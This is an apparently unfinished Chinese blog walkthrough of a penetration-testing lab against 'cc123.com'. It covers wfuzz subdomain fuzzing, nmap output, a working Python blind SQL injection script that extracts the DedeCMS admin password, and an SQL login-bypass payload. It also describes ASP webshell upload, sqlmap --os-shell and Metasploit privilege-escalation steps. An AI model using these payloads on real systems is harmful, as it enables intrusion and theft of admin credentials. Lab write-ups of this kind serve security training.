<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
    <meta name="keywords" content="Hexo Theme Keep">
    <meta name="description" content="Hexo Theme Keep">
    <meta name="author" content="forg12">
    
    <title>
        
            target-cc123 |
        
        forg12&#39;s Blog
    </title>
    
<link rel="stylesheet" href="/css/style.css">

    <link rel="shortcut icon" href="/images/logo.svg">
    
<link rel="stylesheet" href="/css/font-awesome.min.css">

    <script id="hexo-configurations">
    let KEEP = window.KEEP || {};
    KEEP.hexo_config = {"hostname":"forg1222.github.io","root":"/","language":"zh-CN","path":"search.json"};
    KEEP.theme_config = {"toc":{"enable":true,"number":true,"expand_all":true,"init_open":true},"style":{"primary_color":"#0066CC","avatar":"https://forg1222.github.io/images/head.jpeg","favicon":"/images/logo.svg","article_img_align":"left","left_side_width":"260px","content_max_width":"920px","hover":{"shadow":false,"scale":false},"first_screen":{"enable":true,"background_img":"https://forg1222.github.io/images/bg.svg","description":"The price of doing the same old thing is far higher than the price of change."},"scroll":{"progress_bar":{"enable":false},"percent":{"enable":false}}},"local_search":{"enable":true,"preload":true},"code_copy":{"enable":true,"style":"default"},"pjax":{"enable":false},"lazyload":{"enable":false},"version":"6.6.6"};
    KEEP.language_ago = {"second":"%s 秒前","minute":"%s 分钟前","hour":"%s 小时前","day":"%s 天前","week":"%s 周前","month":"%s 个月前","year":"%s 年前"};
  </script>
<meta name="generator" content="Hexo 6.2.0"></head>


<body>
<div class="progress-bar-container">
    

    
</div>


<main class="page-container">

    

    <div class="page-main-content">

        <div class="page-main-content-top">
            <header class="header-wrapper">

    <div class="header-content">
        <div class="left">
            
            <a class="logo-title" href="/">
                forg12&#39;s Blog
            </a>
        </div>

        <div class="right">
            <div class="pc">
                <ul class="menu-list">
                    
                        <li class="menu-item">
                            <a class=""
                               href="/"
                            >
                                首页
                            </a>
                        </li>
                    
                        <li class="menu-item">
                            <a class=""
                               href="/archives"
                            >
                                归档
                            </a>
                        </li>
                    
                        <li class="menu-item">
                            <a class=""
                               href="/categories"
                            >
                                分类
                            </a>
                        </li>
                    
                        <li class="menu-item">
                            <a class=""
                               href="/tags"
                            >
                                标签
                            </a>
                        </li>
                    
                        <li class="menu-item">
                            <a class=""
                               href="/about"
                            >
                                关于
                            </a>
                        </li>
                    
                    
                        <li class="menu-item search search-popup-trigger">
                            <i class="fas fa-search"></i>
                        </li>
                    
                </ul>
            </div>
            <div class="mobile">
                
                    <div class="icon-item search search-popup-trigger"><i class="fas fa-search"></i></div>
                
                <div class="icon-item menu-bar">
                    <div class="menu-bar-middle"></div>
                </div>
            </div>
        </div>
    </div>

    <div class="header-drawer">
        <ul class="drawer-menu-list">
            
                <li class="drawer-menu-item flex-center">
                    <a class=""
                       href="/">首页</a>
                </li>
            
                <li class="drawer-menu-item flex-center">
                    <a class=""
                       href="/archives">归档</a>
                </li>
            
                <li class="drawer-menu-item flex-center">
                    <a class=""
                       href="/categories">分类</a>
                </li>
            
                <li class="drawer-menu-item flex-center">
                    <a class=""
                       href="/tags">标签</a>
                </li>
            
                <li class="drawer-menu-item flex-center">
                    <a class=""
                       href="/about">关于</a>
                </li>
            
        </ul>
    </div>

    <div class="window-mask"></div>

</header>


        </div>

        <div class="page-main-content-middle">

            <div class="main-content">

                
                    <div class="fade-in-down-animation">
    <div class="article-content-container">

        <div class="article-title">
            <span class="title-hover-animation">target-cc123</span>
        </div>

        
            <div class="article-header">
                <div class="avatar">
                    <img src="https://forg1222.github.io/images/head.jpeg">
                </div>
                <div class="info">
                    <div class="author">
                        <span class="name">forg12</span>
                        
                    </div>
                    <div class="meta-info">
                        <div class="article-meta-info">
    <span class="article-date article-meta-item">
        <i class="fas fa-edit"></i>&nbsp;
        <span class="pc">2022-08-15 09:29:22</span>
        <span class="mobile">2022-08-15 09:29</span>
    </span>
    
    

    
    
        <span class="article-wordcount article-meta-item">
            <i class="fas fa-file-word"></i>&nbsp;<span>1.4k 字</span>
        </span>
    
    
    
        <span class="article-pv article-meta-item">
            <i class="fas fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
        </span>
    
</div>

                    </div>
                </div>
            </div>
        

        <div class="article-content markdown-body">
            <h1 id="靶场介绍"><a href="#靶场介绍" class="headerlink" title="靶场介绍"></a>靶场介绍</h1><p>​	该靶场在打之前需要将网络按下面的网络示意图配置好，虚拟机的网卡设置这里就不过多介绍了。另外还需要配置修改靶场的DNS和本地的DNS服务器地址。</p>
<h2 id="网络示意图"><a href="#网络示意图" class="headerlink" title="网络示意图"></a>网络示意图</h2><p><img src="/2022/08/15/target-labs4/image-20220819152257223.png" alt="image-20220819152257223"></p>
<h2 id="DNS修改"><a href="#DNS修改" class="headerlink" title="DNS修改"></a>DNS修改</h2><p>​	找到DNS管理器，在正向查找区域里将子域名的数据都修改为当前搭建环境中能与kali互通的网段IP，即<code>192.168.2.11</code>，然后重启DNS服务和网站。</p>
<p><img src="/2022/08/15/target-labs4/image-20220819151708598.png" alt="image-20220819151708598"></p>
<!--修改后-->

<p><img src="/2022/08/15/target-labs4/image-20220819152455503.png" alt="image-20220819152455503"></p>
<p>​	</p>
<h2 id="DNS服务器绑定"><a href="#DNS服务器绑定" class="headerlink" title="DNS服务器绑定"></a>DNS服务器绑定</h2><p>​	将攻击的机器的DNS服务器地址改为目标靶场第一台WEB服务器的IP地址。具体配置如下：</p>
<h3 id="Windows环境"><a href="#Windows环境" class="headerlink" title="Windows环境"></a>Windows环境</h3><p>​	将首选DNS服务器地址填为目标WEB服务器的IP地址。</p>
<p><img src="/2022/08/15/target-labs4/image-20220819154104648.png" alt="image-20220819154104648"></p>
<h3 id="kali环境"><a href="#kali环境" class="headerlink" title="kali环境"></a>kali环境</h3><p>​	修改<code>etc</code>目录下面的<code>resolv.conf</code>文件。</p>
<p><img src="/2022/08/15/target-labs4/image-20220819154249030.png" alt="image-20220819154249030"></p>
<h2 id="任务描述"><a href="#任务描述" class="headerlink" title="任务描述"></a>任务描述</h2><p>​	该靶场中存在四个flag，第一层服务器有两个flag，其余两个靶机中均有一个flag。给定目标的域名为<code>cc123.com</code>。</p>
<h1 id="第一层：WEB服务器"><a href="#第一层：WEB服务器" class="headerlink" title="第一层：WEB服务器"></a>第一层：WEB服务器</h1><h2 id="子域名收集"><a href="#子域名收集" class="headerlink" title="子域名收集"></a>子域名收集</h2><p>​	</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wfuzz -w /usr/share/amass/wordlists/subdomains-top1mil-5000.txt -u cc123.com -H &quot;Host:FUZZ.cc123.com&quot;  --hw 53,26</span><br></pre></td></tr></table></figure>

<p><img src="/2022/08/15/target-labs4/image-20220819160411328.png" alt="image-20220819160411328"></p>
<h2 id="IP端口及服务探针"><a href="#IP端口及服务探针" class="headerlink" title="IP端口及服务探针"></a>IP端口及服务探针</h2><p><img src="/2022/08/15/target-labs4/image-20220819160456616.png" alt="image-20220819160456616"></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">sudo nmap -sS -sV -T4 -p- -A 192.168.2.11       </span><br><span class="line">Starting Nmap 7.92 ( https://nmap.org ) </span><br><span class="line">Nmap scan report for 192.168.2.11</span><br><span class="line">Host is up (0.022s latency).</span><br><span class="line">Not shown: 65526 filtered tcp ports (no-response)</span><br><span class="line">PORT      STATE SERVICE            VERSION</span><br><span class="line">21/tcp    open  ftp                Microsoft ftpd</span><br><span class="line">| ftp-syst: </span><br><span class="line">|_  SYST: Windows_NT</span><br><span class="line">53/tcp    open  domain             Microsoft DNS 6.1.7601 (1DB1446A) (Windows Server 2008 R2 SP1)</span><br><span class="line">| dns-nsid: </span><br><span class="line">|_  bind.version: Microsoft DNS 6.1.7601 (1DB1446A)</span><br><span class="line">80/tcp    open  http               Microsoft IIS httpd 7.5</span><br><span class="line">|_http-server-header: Microsoft-IIS/7.5</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Potentially risky methods: TRACE</span><br><span class="line">|_http-title: IIS7</span><br><span class="line">135/tcp   open  msrpc              Microsoft Windows RPC</span><br><span class="line">999/tcp   open  http               Microsoft IIS httpd 7.5</span><br><span class="line">|_http-server-header: Microsoft-IIS/7.5</span><br><span class="line">| http-robots.txt: 1 disallowed entry </span><br><span class="line">|_/</span><br><span class="line">|_http-title: phpMyAdmin</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Potentially risky methods: TRACE</span><br><span class="line">3389/tcp  open  ssl/ms-wbt-server?</span><br><span class="line">|_ssl-date: 2022-08-19T08:08:44+00:00; +1s from scanner time.</span><br><span class="line">| ssl-cert: Subject: commonName=WIN-KALKEMT3JMA</span><br><span class="line">| Not valid before: 2022-08-17T06:05:34</span><br><span class="line">|_Not valid after:  2023-02-16T06:05:34</span><br><span class="line">| rdp-ntlm-info: </span><br><span class="line">|   Target_Name: WIN-KALKEMT3JMA</span><br><span class="line">|   NetBIOS_Domain_Name: WIN-KALKEMT3JMA</span><br><span class="line">|   NetBIOS_Computer_Name: WIN-KALKEMT3JMA</span><br><span class="line">|   DNS_Domain_Name: WIN-KALKEMT3JMA</span><br><span class="line">|   DNS_Computer_Name: WIN-KALKEMT3JMA</span><br><span class="line">|   Product_Version: 6.1.7601</span><br><span class="line">|_  System_Time: 2022-08-19T08:08:36+00:00</span><br><span class="line">6588/tcp  open  http               Microsoft IIS httpd 7.5</span><br><span class="line">|_http-server-header: Microsoft-IIS/7.5</span><br><span class="line">|_http-title: \xBB\xA4\xCE\xC0\xC9\xF1\xA1\xA4\xD6\xF7\xBB\xFA\xB4\xF3\xCA\xA6 V3.5.1 - \xC7\xB0\xCC\xA8\xB5\xC7\xC2\xBC</span><br><span class="line">| http-cookie-flags: </span><br><span class="line">|   /: </span><br><span class="line">|     ASPSESSIONIDAABDTCSA: </span><br><span class="line">|_      httponly flag not set</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Potentially risky methods: TRACE</span><br><span class="line">49154/tcp open  msrpc              Microsoft Windows RPC</span><br><span class="line">49155/tcp open  msrpc              Microsoft Windows RPC</span><br><span class="line">MAC Address: 50:2B:73:A8:12:0F (Tenda Technology,Ltd.Dongguan branch)</span><br><span class="line">Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port</span><br><span class="line">OS details: Microsoft Windows Server 2008 or 2008 Beta 3, Microsoft Windows Server 2008 R2 or Windows 8.1, Microsoft Windows 7 Professional or Windows 8, Microsoft Windows Embedded Standard 7, Microsoft Windows 8.1 R1, Microsoft Windows Phone 7.5 or 8.0, Microsoft Windows Vista SP0 or SP1, Windows Server 2008 SP1, or Windows 7, Microsoft Windows Vista SP2, Windows 7 SP1, or Windows Server 2008</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line">Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_server_2008:r2:sp1</span><br><span class="line"></span><br><span class="line">TRACEROUTE</span><br><span class="line">HOP RTT      ADDRESS</span><br><span class="line">1   21.63 ms 192.168.2.11</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 195.26 seconds</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h2 id="Web服务总结"><a href="#Web服务总结" class="headerlink" title="Web服务总结"></a>Web服务总结</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">主域名：</span><br><span class="line">	cc123.com</span><br><span class="line">子域名：</span><br><span class="line">	www.cc123.com</span><br><span class="line">	ww2.cc123.com</span><br><span class="line">	new.cc123.com</span><br><span class="line">IP及放开的web端口：</span><br><span class="line">	192.168.2.11:80</span><br><span class="line">	192.168.2.11:999</span><br><span class="line">	192.168.2.11:6588</span><br></pre></td></tr></table></figure>

<h3 id="cc123-com"><a href="#cc123-com" class="headerlink" title="cc123.com"></a>cc123.com</h3><img src="/2022/08/15/target-labs4/image-20220819161519437.png" alt="image-20220819161519437">



<h3 id="www-cc123-com"><a href="#www-cc123-com" class="headerlink" title="www.cc123.com"></a><a class="link" target="_blank" rel="noopener" href="http://www.cc123.com/">www.cc123.com<i class="fas fa-external-link-alt"></i></a></h3><img src="/2022/08/15/target-labs4/image-20220819161632369.png" alt="image-20220819161632369">



<h3 id="ww2-cc123-com"><a href="#ww2-cc123-com" class="headerlink" title="ww2.cc123.com"></a>ww2.cc123.com</h3><img src="/2022/08/15/target-labs4/image-20220819161733615.png" alt="image-20220819161733615">

<h3 id="new-cc123-com"><a href="#new-cc123-com" class="headerlink" title="new.cc123.com"></a>new.cc123.com</h3><img src="/2022/08/15/target-labs4/image-20220819161800163.png" alt="image-20220819161800163">



<h3 id="192-168-2-11-80"><a href="#192-168-2-11-80" class="headerlink" title="192.168.2.11:80"></a>192.168.2.11:80</h3><img src="/2022/08/15/target-labs4/image-20220819161919374.png" alt="image-20220819161919374">

<h3 id="192-168-2-11-999"><a href="#192-168-2-11-999" class="headerlink" title="192.168.2.11:999"></a>192.168.2.11:999</h3><img src="/2022/08/15/target-labs4/image-20220819161905698.png" alt="image-20220819161905698">

<h3 id="192-168-2-11-6588"><a href="#192-168-2-11-6588" class="headerlink" title="192.168.2.11:6588"></a>192.168.2.11:6588</h3><img src="/2022/08/15/target-labs4/image-20220819161850145.png" alt="image-20220819161850145">

<h2 id="目录遍历"><a href="#目录遍历" class="headerlink" title="目录遍历"></a>目录遍历</h2><p>​	对上述的网站进行目录遍历，发现一些有用信息：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">dedecms 用户登录页面</span><br><span class="line">http://new.cc123.com/member/</span><br><span class="line">Grcms 后台登录口</span><br><span class="line">http://ww2.cc123.com/admin/Login.aspx </span><br></pre></td></tr></table></figure>

<p><img src="/2022/08/15/target-labs4/image-20220819163235247.png" alt="image-20220819163235247"></p>
<p><img src="/2022/08/15/target-labs4/image-20220819163345535.png" alt="image-20220819163345535"></p>
<p><img src="/2022/08/15/target-labs4/image-20220819163053721.png" alt="image-20220819163053721"></p>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h3 id="dedecms"><a href="#dedecms" class="headerlink" title="dedecms"></a>dedecms</h3><h4 id="查看版本信息"><a href="#查看版本信息" class="headerlink" title="查看版本信息"></a>查看版本信息</h4><p>​	通过目录遍历找到了会员登录口，查看版本信息。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dedecms/data/admin/ver.txt</span><br></pre></td></tr></table></figure>

<p><img src="/2022/08/15/target-labs4/image-20220819164245630.png" alt="image-20220819164245630"></p>
<p><img src="/2022/08/15/target-labs4/image-20220819164337482.png" alt="image-20220819164337482"></p>
<h4 id="dede-20150618前台注入"><a href="#dede-20150618前台注入" class="headerlink" title="dede 20150618前台注入"></a>dede 20150618前台注入</h4><p>​	通过搜索版本号对应漏洞，利用方式为登录会员中心，在系统设置里面的分类管理里面添加分类。</p>
<p><img src="/2022/08/15/target-labs4/image-20220819171322750.png" alt="image-20220819171322750"></p>
<p>​	参考网上的文章，利用下面的python脚本拿到管理员的权限。	</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib2</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">opener = urllib2.build_opener()</span><br><span class="line">opener.addheaders.append((<span class="string">&#x27;Cookie&#x27;</span>, <span class="string">&#x27; _ga_7VBGV5VRLB=GS1.1.1660727069.1.0.1660727069.0.0.0; _ga=GA1.2.1328479163.1660727069; _ga_6NMMDGGQXS=GS1.1.1660727069.1.0.1660727069.0.0.0; PHPSESSID=06k4j63l1p56auav9qqht086k4; DedeUserID=4; DedeUserID__ckMd5=f02b1d395cb070ca; DedeLoginTime=1660899504; DedeLoginTime__ckMd5=1047815d583efef&#x27;</span>))</span><br><span class="line">payloads = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyz0123456789@_.&#x27;</span></span><br><span class="line">name = <span class="string">&quot;admin&quot;</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">21</span>):</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">for</span> p <span class="keyword">in</span> payloads:</span><br><span class="line"> </span><br><span class="line">        s1 = <span class="string">&quot;%s&quot;</span> %(i)</span><br><span class="line">        s2 = <span class="string">&quot;%s&quot;</span> %(<span class="built_in">ord</span>(p))</span><br><span class="line"> </span><br><span class="line">        s = <span class="string">&quot;http://new.cc123.com/member/mtypes.php?dopost=save&amp;_FILES[mtypename][name]=.xxxx&amp;_FILES[mtypename][type]=xxxxx&amp;_FILES[mtypename][tmp_name][a&#x27;%20and%20`&#x27;`.``.mtypeid%20or%20if(ascii(substr((select%20pwd%20from%20dede_admin%20limit%201),&quot;</span>+s1+<span class="string">&quot;,1))%3d&quot;</span>+s2+<span class="string">&quot;,sleep(3),0)%20and%20mtypeid%3d1%23]=w&amp;_FILES[mtypename][size]=.xxxx&quot;</span></span><br><span class="line"> </span><br><span class="line">        start_time = time.time()</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line"> </span><br><span class="line">            req = urllib2.Request(s)</span><br><span class="line">                        </span><br><span class="line">            req_data=opener.<span class="built_in">open</span>(req,timeout=<span class="number">10</span>)</span><br><span class="line"> </span><br><span class="line">            <span class="keyword">if</span> time.time() - start_time &gt; <span class="number">2.0</span>:</span><br><span class="line"> </span><br><span class="line">                name = name+p</span><br><span class="line"> </span><br><span class="line">                <span class="built_in">print</span> name+<span class="string">&#x27;.....&#x27;</span></span><br><span class="line"> </span><br><span class="line">        <span class="keyword">except</span> urllib2.URLError,e:</span><br><span class="line"> </span><br><span class="line">             <span class="keyword">break</span></span><br><span class="line"> </span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;password is %s&#x27;</span>  % name</span><br></pre></td></tr></table></figure>

<p><img src="/2022/08/15/target-labs4/image-20220819171510487.png" alt="image-20220819171510487"></p>
<p><img src="/2022/08/15/target-labs4/image-20220819171622250.png" alt="image-20220819171622250"></p>
<h4 id="后台文件上传"><a href="#后台文件上传" class="headerlink" title="后台文件上传"></a>后台文件上传</h4><p>​	通过注入拿到后台管理员的密码，该后台附件管理中的文件式管理器可以直接上传php文件。	</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://new.cc123.com/dede/</span><br></pre></td></tr></table></figure>

<p><img src="/2022/08/15/target-labs4/image-20220819172543298.png" alt="image-20220819172543298"></p>
<p>​	文件上传路径</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://new.cc123.com/uploads/</span><br></pre></td></tr></table></figure>

<p><img src="/2022/08/15/target-labs4/image-20220819172716972.png" alt="image-20220819172716972"></p>
<p><img src="/2022/08/15/target-labs4/image-20220819172820237.png" alt="image-20220819172820237">	</p>
<p>​	PHP后门不能执行命令，因为这里是IIS服务器，尝试上传ASP后门后成功。</p>
<p><img src="/2022/08/15/target-labs4/image-20220819173830302.png" alt="image-20220819173830302"></p>
<h3 id="Grcms-后台登录口"><a href="#Grcms-后台登录口" class="headerlink" title="Grcms 后台登录口"></a>Grcms 后台登录口</h3><h4 id="sqlmap"><a href="#sqlmap" class="headerlink" title="sqlmap"></a>sqlmap</h4><p>把登录的数据包丢到sqlmap里面跑一遍，发现<code>username</code>参数存在堆叠注入。</p>
<p><img src="/2022/08/15/target-labs4/image-20220822142142710.png" alt="image-20220822142142710"></p>
<p>​	既然有注入，直接用<code>--os-shell</code>，成功拿到高权限<code>nt authority\system</code>。</p>
<p><img src="/2022/08/15/target-labs4/image-20220822143123510.png" alt="image-20220822143123510"></p>
<p>​	因为这个网站是站库分离类型的网站，这里执行的命令是拓扑图上面的在拓扑上面的数据库服务器。</p>
<h4 id="手工测试"><a href="#手工测试" class="headerlink" title="手工测试"></a>手工测试</h4><p>抓到登录数据包进行测试，将<code>username</code>参数改为payload：<code>admin&#39;or+1=1--+</code>	直接通过验证 </p>
<p><img src="/2022/08/15/target-labs4/image-20220822141529574.png" alt="image-20220822141529574">	</p>
<p><img src="/2022/08/15/target-labs4/image-20220822144330944.png" alt="image-20220822144330944"></p>
<h4 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h4><p>​	在管理后台找到editor编辑器，尝试</p>
<h2 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h2><h2 id="msf"><a href="#msf" class="headerlink" title="msf"></a>msf</h2><p>​	上传冰蝎马，反弹shell。</p>
<p><img src="/2022/08/15/target-labs4/image-20220822151830886.png" alt="image-20220822151830886"></p>
<p><img src="/2022/08/15/target-labs4/image-20220822151850101.png" alt="image-20220822151850101"></p>
<p>​	使用suggest查看可提权漏洞</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use post/multi/recon/local_exploit_suggester</span><br><span class="line">msf6 post(multi/recon/local_exploit_suggester) &gt; set session 1 </span><br><span class="line">session =&gt; 1</span><br><span class="line">msf6 post(multi/recon/local_exploit_suggester) &gt; exploit </span><br></pre></td></tr></table></figure>







<h2 id="Cobalt-strike"><a href="#Cobalt-strike" class="headerlink" title="Cobalt strike"></a>Cobalt strike</h2><h1 id="第二层：数据库服务器"><a href="#第二层：数据库服务器" class="headerlink" title="第二层：数据库服务器"></a>第二层：数据库服务器</h1><h1 id="第三层：目标机器"><a href="#第三层：目标机器" class="headerlink" title="第三层：目标机器"></a>第三层：目标机器</h1>
        </div>

        

        

        
            <div class="article-nav">
                
                    <div class="article-prev">
                        <a class="prev"
                           rel="prev"
                           href="/2022/10/18/CVE-2019-0232-Apache-Tomcat-RCE/"
                        >
                            <span class="left arrow-icon flex-center">
                              <i class="fas fa-chevron-left"></i>
                            </span>
                            <span class="title flex-center">
                                <span class="post-nav-title-item">CVE-2019-0232-Apache-Tomcat-RCE</span>
                                <span class="post-nav-item">上一篇</span>
                            </span>
                        </a>
                    </div>
                
                
                    <div class="article-next">
                        <a class="next"
                           rel="next"
                           href="/2022/08/13/vulnhub-sickos1-2/"
                        >
                            <span class="title flex-center">
                                <span class="post-nav-title-item">vulnhub-sickos1.2</span>
                                <span class="post-nav-item">下一篇</span>
                            </span>
                            <span class="right arrow-icon flex-center">
                              <i class="fas fa-chevron-right"></i>
                            </span>
                        </a>
                    </div>
                
            </div>
        

        
    </div>
</div>


                
            </div>

        </div>

        <div class="page-main-content-bottom">
            <footer class="footer">
    <div class="info-container">
        <div class="copyright-info info-item">
            &copy;
            
              <span>2020</span>
              -
            
            2024&nbsp;<i class="fas fa-heart icon-animate"></i>&nbsp;<a href="/">forg12</a>
        </div>
        
            <script async  src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
            <div class="website-count info-item">
                
                    <span id="busuanzi_container_site_uv">
                        访问人数&nbsp;<span id="busuanzi_value_site_uv"></span>&ensp;
                    </span>
                
                
                    <span id="busuanzi_container_site_pv">
                        总访问量&nbsp;<span id="busuanzi_value_site_pv"></span>
                    </span>
                
            </div>
        
        <div class="theme-info info-item">
            由 <a target="_blank" href="https://hexo.io">Hexo</a> 驱动&nbsp;|&nbsp;主题&nbsp;<a class="theme-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep v6.6.6</a>
        </div>
        
        
    </div>
</footer>

        </div>
    </div>

    
        <div class="post-tools">
            <div class="post-tools-container">
    <ul class="tools-list">
        <!-- TOC aside toggle -->
        
            <li class="tools-item page-aside-toggle">
                <i class="fas fa-outdent"></i>
            </li>
        

        <!-- go comment -->
        
    </ul>
</div>

        </div>
    

    <div class="right-bottom-side-tools">
        <div class="side-tools-container">
    <ul class="side-tools-list">
        <li class="tools-item tool-font-adjust-plus flex-center">
            <i class="fas fa-search-plus"></i>
        </li>

        <li class="tools-item tool-font-adjust-minus flex-center">
            <i class="fas fa-search-minus"></i>
        </li>

        <li class="tools-item tool-expand-width flex-center">
            <i class="fas fa-arrows-alt-h"></i>
        </li>

        <li class="tools-item tool-dark-light-toggle flex-center">
            <i class="fas fa-moon"></i>
        </li>

        <!-- rss -->
        

        
            <li class="tools-item tool-scroll-to-top flex-center">
                <i class="fas fa-arrow-up"></i>
            </li>
        

        <li class="tools-item tool-scroll-to-bottom flex-center">
            <i class="fas fa-arrow-down"></i>
        </li>
    </ul>

    <ul class="exposed-tools-list">
        <li class="tools-item tool-toggle-show flex-center">
            <i class="fas fa-cog fa-spin"></i>
        </li>
        
    </ul>
</div>

    </div>

    
        <aside class="page-aside">
            <div class="post-toc-wrap">
    <div class="post-toc">
        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E9%9D%B6%E5%9C%BA%E4%BB%8B%E7%BB%8D"><span class="nav-number">1.</span> <span class="nav-text">靶场介绍</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%BD%91%E7%BB%9C%E7%A4%BA%E6%84%8F%E5%9B%BE"><span class="nav-number">1.1.</span> <span class="nav-text">网络示意图</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#DNS%E4%BF%AE%E6%94%B9"><span class="nav-number">1.2.</span> <span class="nav-text">DNS修改</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#DNS%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%BB%91%E5%AE%9A"><span class="nav-number">1.3.</span> <span class="nav-text">DNS服务器绑定</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Windows%E7%8E%AF%E5%A2%83"><span class="nav-number">1.3.1.</span> <span class="nav-text">Windows环境</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#kali%E7%8E%AF%E5%A2%83"><span class="nav-number">1.3.2.</span> <span class="nav-text">kali环境</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BB%BB%E5%8A%A1%E6%8F%8F%E8%BF%B0"><span class="nav-number">1.4.</span> <span class="nav-text">任务描述</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%AC%AC%E4%B8%80%E5%B1%82%EF%BC%9AWEB%E6%9C%8D%E5%8A%A1%E5%99%A8"><span class="nav-number">2.</span> <span class="nav-text">第一层：WEB服务器</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AD%90%E5%9F%9F%E5%90%8D%E6%94%B6%E9%9B%86"><span class="nav-number">2.1.</span> <span class="nav-text">子域名收集</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#IP%E7%AB%AF%E5%8F%A3%E5%8F%8A%E6%9C%8D%E5%8A%A1%E6%8E%A2%E9%92%88"><span class="nav-number">2.2.</span> <span class="nav-text">IP端口及服务探针</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" 